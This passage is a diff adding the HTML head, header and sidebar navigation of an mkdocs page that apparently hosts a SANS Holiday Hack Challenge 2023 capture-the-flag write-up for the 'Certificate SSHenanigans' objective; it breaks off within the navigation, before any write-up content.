@@ -1,0 +1,1558 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Shahne Rodgers">
+      
+      
+      
+        <link rel="prev" href="o16.html">
+      
+      
+        <link rel="next" href="o20.html">
+      
+      
+      <link rel="icon" href="../img/misc/favicon.ico">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
+    
+    
+      
+        <title>Certificate SSHenanigans - SANS Holiday Hack Challenge 2023 Write-Up</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.50c56a3b.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../css/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#certificate-sshenanigans" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="SANS Holiday Hack Challenge 2023 Write-Up" class="md-header__button md-logo" aria-label="SANS Holiday Hack Challenge 2023 Write-Up" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 15.26V13h-4l4-4h-3l3-3h-2l3-3 3 3h-2l3 3h-3l4 4h-4v2.76c2.13.71 3.68 1.91 4 3.24-1.7-.13-3.38-.46-5-1-1.21.61-2.63 1-4 1-1.29 0-2.83-.42-4-1-1.63.54-3.28.87-5 1 .54-2.23 4.4-4 9-4 1.05 0 2.06.09 3 .26M8 19s-3 1-6 1v2c3 0 6-1 6-1s2 1 4 1 4-1 4-1 3 1 6 1v-2c-3 0-6-1-6-1s-2 1-4 1-4-1-4-1Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            SANS Holiday Hack Challenge 2023 Write-Up
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Certificate SSHenanigans
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="green"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31Z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22Z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="SANS Holiday Hack Challenge 2023 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holiday Hack Challenge 2023 Write-Up" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 15.26V13h-4l4-4h-3l3-3h-2l3-3 3 3h-2l3 3h-3l4 4h-4v2.76c2.13.71 3.68 1.91 4 3.24-1.7-.13-3.38-.46-5-1-1.21.61-2.63 1-4 1-1.29 0-2.83-.42-4-1-1.63.54-3.28.87-5 1 .54-2.23 4.4-4 9-4 1.05 0 2.06.09 3 .26M8 19s-3 1-6 1v2c3 0 6-1 6-1s2 1 4 1 4-1 4-1 3 1 6 1v-2c-3 0-6-1-6-1s-2 1-4 1-4-1-4-1Z"/></svg>
+
+    </a>
+    SANS Holiday Hack Challenge 2023 Write-Up
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Objectives
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Objectives
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Christmas Island
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Christmas Island
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o2.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Snowball Fight
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o3.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Linux 101
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o4.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Reportinator
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o5.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Azure 101
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Island of Misfit Toys
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Island of Misfit Toys
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o6.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Luggage Lock
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o7.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Linux PrivEsc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o15.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Hashcat
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Steampunk Island
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Steampunk Island
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o8.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Faster Lock Combination
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o18.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    The Captain's Comms
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o19.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Active Directory
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Game Cartridges
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Game Cartridges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o9.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Vol 1
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o10.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Vol 2
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o11.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Vol 3
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Film Noir Island
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            Film Noir Island
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o12.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Na'an
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o13.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    KQL Kraken Hunt
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o14.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Phish Detection Agency
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Pixel Island
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            Pixel Island
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o16.html" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Elf Hunt
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Certificate SSHenanigans
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="o17.html" class="md-nav__link md-nav__link--active">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Certificate SSHenanigans
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hints
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solution
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#response" class="md-nav__link">
+    <span class="md-ellipsis">
+      Response
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Space Island
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_7">
+            <span class="md-nav__icon md-icon"></span>
+            Space Island
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="o20.html" class="md-nav__link">
+        
+  
